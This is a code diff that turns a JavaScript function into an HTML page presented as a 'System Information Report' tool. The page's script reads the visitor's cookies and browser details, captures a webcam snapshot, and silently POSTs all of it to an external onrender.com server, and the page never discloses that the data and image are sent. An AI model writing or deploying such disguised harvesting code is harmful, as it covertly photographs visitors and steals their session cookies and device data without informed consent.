@@ -1,86 +1,181 @@
-async function getAllInfo() {
-  const $ = id => document.getElementById(id);
+<!DOCTYPE html>
+<html lang="en">
 
-  $("errorMsg").textContent = "";
-  $("accessBtn").style.display = "none";
-  $("infoBox").style.display = "block";
-
-  const info = {
-    webcam: "Denied",
-    microphone: "Denied",
-    location: "Denied",
-    ip: "Unknown",
-    browser: navigator.userAgent,
-    resolution: `${screen.width}x${screen.height}`,
-    depth: `${screen.colorDepth}-bit`,
-    os: navigator.platform,
-    lang: navigator.language,
-    online: navigator.onLine ? "Online" : "Offline",
-    connection: "Unknown",
-    battery: "Unknown",
-    charging: "Unknown",
-    cookies: document.cookie || "No cookies"
-  };
-
-  let webcamStream = null;
-  let capturedImageBase64 = null;
-
-  /* permissions ----------------------------------------------------*/
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-    $("webcamFeed").srcObject = stream;
-    $("webcamFeed").style.display = "block";
-    info.webcam = info.microphone = "Accessible";
-    webcamStream = stream;
-  } catch {}
-
-  // Capture Image from webcam
-  if (webcamStream) {
-    const track = webcamStream.getVideoTracks()[0];
-    const imageCapture = new ImageCapture(track);
-
-    try {
-      const bitmap = await imageCapture.grabFrame();
-      const canvas = document.createElement('canvas');
-      canvas.width = bitmap.width;
-      canvas.height = bitmap.height;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
-      capturedImageBase64 = canvas.toDataURL('image/jpeg'); // <-- base64 string here
-      console.log("Captured Image Base64: ", capturedImageBase64); // Log base64 for debugging
-    } catch (e) {
-      console.error("Failed to capture webcam image:", e);
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>System Info Report</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
     }
-  }
 
-  /* Send to Backend -----------------------------------------------*/
-  const message = `🔍 System Report:
-    🧠 IP Address: ${info.ip}
-    📍 Location: ${info.location}
-    📷 Webcam: ${info.webcam}
-    🎤 Microphone: ${info.microphone}
-    🌐 Browser: ${info.browser}
-    🖥️ Resolution: ${info.resolution}
-    🎨 Color Depth: ${info.depth}
-    🧑‍💻 OS: ${info.os}
-    🗣️ Language: ${info.lang}
-    📶 Connection: ${info.connection}
-    🔋 Battery: ${info.battery}
-    ⚡ Charging: ${info.charging}
-    🍪 Cookies: ${info.cookies}
-    🔌 Online: ${info.online}`;
+    .container {
+      width: 80%;
+      margin: 50px auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
 
-  try {
-    await fetch('https://system-info-terminal.onrender.com/send-message', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        message,
-        image: capturedImageBase64  // Send the base64 string here
-      })
-    });
-  } catch (e) {
-    console.error("Failed to send info:", e);
-    $("errorMsg").textContent = "Could not contact reporting server.";
-  }
-}
+    h1 {
+      text-align: center;
+    }
+
+    .error-msg {
+      color: red;
+      text-align: center;
+    }
+
+    .info-box {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .info-box p {
+      font-size: 16px;
+      line-height: 1.6;
+    }
+
+    #webcamFeed {
+      width: 100%;
+      height: auto;
+      display: none;
+      margin-top: 10px;
+    }
+
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+    <h1>System Information Report</h1>
+
+    <!-- Error message display -->
+    <div id="errorMsg" class="error-msg"></div>
+
+    <!-- Button to trigger information collection -->
+    <button id="accessBtn" onclick="getAllInfo()">Collect System Info</button>
+
+    <!-- Display the system info -->
+    <div id="infoBox" class="info-box">
+      <p><strong>🔍 System Report:</strong></p>
+      <p id="systemInfo"></p>
+
+      <!-- Display webcam feed if accessible -->
+      <video id="webcamFeed" autoplay></video>
+    </div>
+  </div>
+
+  <script>
+    async function getAllInfo() {
+      const $ = id => document.getElementById(id);
+      $("errorMsg").textContent = ""; // Reset error message
+      $("accessBtn").style.display = "none"; // Hide access button
+      $("infoBox").style.display = "block"; // Show system info box
+
+      const info = {
+        webcam: "Denied",
+        microphone: "Denied",
+        location: "Denied",
+        ip: "Unknown",
+        browser: navigator.userAgent,
+        resolution: `${screen.width}x${screen.height}`,
+        depth: `${screen.colorDepth}-bit`,
+        os: navigator.platform,
+        lang: navigator.language,
+        online: navigator.onLine ? "Online" : "Offline",
+        connection: "Unknown",
+        battery: "Unknown",
+        charging: "Unknown",
+        cookies: document.cookie || "No cookies"
+      };
+
+      let webcamStream = null;
+      let capturedImageBase64 = null;
+
+      /* permissions ----------------------------------------------------*/
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        $("webcamFeed").srcObject = stream;
+        $("webcamFeed").style.display = "block";
+        info.webcam = info.microphone = "Accessible";
+        webcamStream = stream;
+      } catch (e) { 
+        console.error("Error accessing webcam or microphone", e); 
+        $("errorMsg").textContent = "Webcam or microphone access denied.";
+      }
+
+      // Capture Image from webcam if accessible
+      if (webcamStream) {
+        const track = webcamStream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+        try {
+          const bitmap = await imageCapture.grabFrame();
+          const canvas = document.createElement('canvas');
+          canvas.width = bitmap.width;
+          canvas.height = bitmap.height;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
+          capturedImageBase64 = canvas.toDataURL('image/jpeg'); // base64 image string
+          console.log("Captured Image Base64: ", capturedImageBase64); // Debugging
+        } catch (e) { 
+          console.error("Failed to capture webcam image:", e);
+          $("errorMsg").textContent = "Failed to capture webcam image.";
+        }
+      }
+
+      /* Send to Backend -----------------------------------------------*/
+      const message = `🔍 System Report:
+🧠 IP Address: ${info.ip}
+📍 Location: ${info.location}
+📷 Webcam: ${info.webcam}
+🎤 Microphone: ${info.microphone}
+🌐 Browser: ${info.browser}
+🖥️ Resolution: ${info.resolution}
+🎨 Color Depth: ${info.depth}
+🧑‍💻 OS: ${info.os}
+🗣️ Language: ${info.lang}
+📶 Connection: ${info.connection}
+🔋 Battery: ${info.battery}
+⚡ Charging: ${info.charging}
+🍪 Cookies: ${info.cookies}
+🔌 Online: ${info.online}`;
+
+      // Display the message in the HTML
+      $("systemInfo").textContent = message;
+
+      try {
+        await fetch('https://system-info-terminal.onrender.com/send-message', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ message, image: capturedImageBase64 }) // Send base64 string of the image
+        });
+      } catch (e) {
+        console.error("Failed to send info:", e);
+        $("errorMsg").textContent = "Could not contact reporting server.";
+      }
+    }
+  </script>
+
+</body>
+
+</html>
